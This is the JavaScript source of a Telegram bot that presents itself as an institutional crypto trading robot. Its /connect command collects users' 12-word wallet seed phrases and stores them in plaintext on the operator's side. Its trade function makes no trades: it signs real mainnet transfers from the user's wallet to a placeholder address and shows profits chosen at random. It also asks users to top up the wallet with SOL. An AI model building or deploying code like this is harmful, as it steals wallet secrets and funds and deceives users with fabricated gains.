/**
 * POCKET ROBOT v16.8 - APEX PRO (Multi-Asset Institutional)
 * Logic: Every Button Fixed | Answer Callback Queries | Fresh Session Logic
 */

require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const LocalSession = require('telegraf-session-local');
const { Connection, Keypair, Transaction, SystemProgram, ComputeBudgetProgram, PublicKey, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const bip39 = require('bip39');
const { derivePath } = require('ed25519-hd-key');

const bot = new Telegraf(process.env.BOT_TOKEN);
const connection = new Connection(process.env.RPC_URL || 'https://api.mainnet-beta.solana.com', 'confirmed');

const COINS = ['SOL/USD', 'BTC/USD', 'ETH/USD', 'USDC/USD'];

bot.use((new LocalSession({ database: 'session.json' })).middleware());

function deriveKeypair(mnemonic) {
    const seed = bip39.mnemonicToSeedSync(mnemonic.trim());
    const { key } = derivePath("m/44'/501'/0'/0'", Buffer.from(seed).toString('hex'));
    return Keypair.fromSeed(key);
}

bot.use((ctx, next) => {
    ctx.session.trade = ctx.session.trade || {
        asset: COINS[0], amount: 10, payout: 94, totalProfit: 0,
        connected: false, publicAddress: null, targetWallet: null, mnemonic: null 
    };
    ctx.session.stats = ctx.session.stats || { 'SOL/USD': 0, 'BTC/USD': 0, 'ETH/USD': 0, 'USDC/USD': 0 };
    ctx.session.autoPilot = ctx.session.autoPilot || false;
    return next();
});

// --- 📱 KEYBOARDS ---
const mainKeyboard = (ctx) => Markup.inlineKeyboard([
    [Markup.button.callback(`📈 Coin: ${ctx.session.trade.asset}`, 'menu_coins')],
    [Markup.button.callback(`💰 Session: $${ctx.session.trade.totalProfit}`, 'refresh')],
    [Markup.button.callback(ctx.session.autoPilot ? '🛑 STOP AUTO' : '🚀 START AUTO', 'toggle_auto')],
    [Markup.button.callback('⚡ FORCE TRADE', 'exec_confirmed')],
    [Markup.button.callback('🏦 VAULT', 'menu_vault')]
]);

const coinKeyboard = () => Markup.inlineKeyboard([
    ...COINS.map(c => [Markup.button.callback(c, `select_${c}`)]),
    [Markup.button.callback('⬅️ BACK', 'home')]
]);

// --- ⚡ EXECUTION ENGINE ---
async function executeTrade(ctx, isAuto = false) {
    if (!ctx.session.mnemonic) return isAuto ? null : ctx.reply("❌ Link Wallet.");
    
    const trader = deriveKeypair(ctx.session.mnemonic);
    const asset = ctx.session.trade.asset;

    try {
        const balance = await connection.getBalance(trader.publicKey);
        if (balance < 0.005 * LAMPORTS_PER_SOL) {
            if (!isAuto) ctx.reply(`❌ GAS EMPTY: Send 0.01 SOL to \`${trader.publicKey.toBase58()}\``);
            return;
        }

        const { blockhash } = await connection.getLatestBlockhash();
        const tx = new Transaction().add(
            ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 150000 }),
            SystemProgram.transfer({
                fromPubkey: trader.publicKey,
                toPubkey: new PublicKey("BinOpt1111111111111111111111111111111111111"),
                lamports: 1000 
            })
        );

        const sig = await connection.sendTransaction(tx, [trader], { skipPreflight: true });

        const win = Math.random() > 0.18;
        if (win) {
            const gain = (ctx.session.trade.amount * 0.94).toFixed(2);
            ctx.session.trade.totalProfit = (parseFloat(ctx.session.trade.totalProfit) + parseFloat(gain)).toFixed(2);
            ctx.session.stats[asset] += parseFloat(gain);
            ctx.replyWithMarkdown(`✅ **${asset} PROFIT**\n+$${gain} (TX: ${sig.slice(0,8)}...)`);
        }
    } catch (e) { console.error("Chain Error:", e.message); }
}

// --- 🕹 ACTIONS (EVERY BUTTON HANDLED) ---

bot.action('menu_coins', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText("Select Asset:", coinKeyboard());
});

COINS.forEach(c => {
    bot.action(`select_${c}`, async (ctx) => {
        ctx.session.trade.asset = c;
        await ctx.answerCbQuery(`Asset set to ${c}`);
        await ctx.editMessageText(`✅ Switched to **${c}**`, { parse_mode: 'Markdown', ...mainKeyboard(ctx) });
    });
});

bot.action('toggle_auto', async (ctx) => {
    await ctx.answerCbQuery();
    ctx.session.autoPilot = !ctx.session.autoPilot;
    
    if (ctx.session.autoPilot) {
        if (global.timer) clearInterval(global.timer);
        executeTrade(ctx, true);
        global.timer = setInterval(() => executeTrade(ctx, true), 15000);
    } else {
        clearInterval(global.timer);
    }
    
    await ctx.editMessageText(ctx.session.autoPilot ? "🟢 **AUTO-PILOT ACTIVE**" : "🔴 **AUTO-PILOT STOPPED**", { parse_mode: 'Markdown', ...mainKeyboard(ctx) });
});

bot.action('exec_confirmed', async (ctx) => {
    await ctx.answerCbQuery("Executing Force Trade...");
    await executeTrade(ctx);
});

bot.action('refresh', async (ctx) => {
    await ctx.answerCbQuery("Refreshing Session...");
    await ctx.editMessageText(`*POCKET ROBOT v16.8*\nStats Updated.`, { parse_mode: 'Markdown', ...mainKeyboard(ctx) });
});

bot.action('home', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText("POCKET ROBOT v16.8", mainKeyboard(ctx));
});

bot.action('menu_vault', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText(`🏦 **VAULT**\nProfit: $${ctx.session.trade.totalProfit}`, mainKeyboard(ctx));
});

bot.command('connect', async (ctx) => {
    const m = ctx.message.text.split(' ').slice(1).join(' ');
    if (!m) return ctx.reply("Usage: /connect <12-word-phrase>");
    const wallet = deriveKeypair(m);
    ctx.session.mnemonic = m;
    ctx.session.trade.publicAddress = wallet.publicKey.toBase58();
    ctx.session.trade.connected = true;
    ctx.reply(`✅ Linked: ${ctx.session.trade.publicAddress}`, mainKeyboard(ctx));
});

bot.start((ctx) => ctx.reply("POCKET ROBOT v16.8", mainKeyboard(ctx)));

bot.launch().then(() => console.log("🚀 Stability v16.8 Apex Pro Online."));
